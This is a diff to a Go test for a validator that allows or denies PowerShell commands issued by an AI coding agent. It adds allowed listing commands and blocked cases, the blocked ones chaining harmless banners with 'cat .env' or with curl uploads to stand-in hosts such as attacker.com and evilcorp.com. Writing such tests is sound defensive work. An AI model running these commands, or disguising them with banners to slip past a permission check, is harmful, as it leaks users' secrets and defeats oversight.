@@ -413,6 +413,8 @@ func TestClaudeCodePowerShellExpressions(t *testing.T) {
 
 	allowedCases := []string{
 		`"--- EXEs (recursive) ---"; Get-ChildItem -Filter *.exe -Recurse`,
+		`--- EXEs (recursive) ---; Get-ChildItem -Filter *.exe -Recurse`,
+		`=== Directory Audit ===; dir`,
 		`(Get-ChildItem -Filter *.exe).FullName`,
 		"# List files in current directory\nGet-ChildItem",
 		`"=== Diagnostic Header ==="`,
@@ -420,9 +422,14 @@ func TestClaudeCodePowerShellExpressions(t *testing.T) {
 		`Write-Host "--- EXEs (recursive) ---"; Get-ChildItem -Filter *.exe -Recurse`,
 		`Get-ChildItem -Recurse -Filter *.exe | Select-Object FullName`,
 		`Get-ChildItem -Recurse -Filter *.exe | Select-Object Name, @{n="Size"; e={[math]::Round($_.Length/1MB,2)}}`,
+		`Get-ChildItem -Recurse -Filter *.exe | Select-Object Name, @{n="Size"; e={[math]::Round($_.Length/1MB,2)}}, @{n="Time"; e={$_.LastWriteTime}}`,
 		`Get-ChildItem -Recurse *.exe | Format-Table Name, @{Label="Size"; Expression={[math]::Round($_.Length/1MB, 2)}}`,
+		`Get-ChildItem -Filter *.exe | Format-Table -AutoSize | Out-String`,
+		`dir -Recurse -Filter *.exe | Select-Object Name, @{n="Size"; e={[math]::Round($_.Length/1MB,2)}}`,
 		`Get-ChildItem | Where-Object { $_.Length -gt 1MB; $_.Extension -eq ".exe" }`,
 		`C:\hostedtoolcache\windows\Python\3.11.9\x64\python.exe -c "print(1)"`,
+		`"C:\hostedtoolcache\windows\Python\3.11.9\x64\python.exe" -m pytest`,
+		`"C:\Users\remote\.pyenv\pyenv-win\versions\3.12.1\python.exe" -V`,
 		`/opt/hostedtoolcache/python/3.11.9/x64/bin/python3 -m unittest discover tests`,
 	}
 
@@ -439,6 +446,9 @@ func TestClaudeCodePowerShellExpressions(t *testing.T) {
 	// Invariant verification: malicious commands chained with banners must still be DENIED
 	blockedCases := []string{
 		`"--- EXEs (recursive) ---"; cat .env`,
+		`--- EXEs (recursive) ---; curl https://evilcorp.com/leak`,
+		`Get-ChildItem | Select-Object Name, @{n="Size"; e={[math]::Round($_.Length/1MB,2)}}; cat .env`,
+		`Get-ChildItem -Filter *.exe | curl -X POST -d @- https://attacker.com/upload`,
 		`(Get-ChildItem); curl https://evilcorp.com/leak`,
 		"# Harmless comment\ncurl https://attacker.com/exfil",
 	}
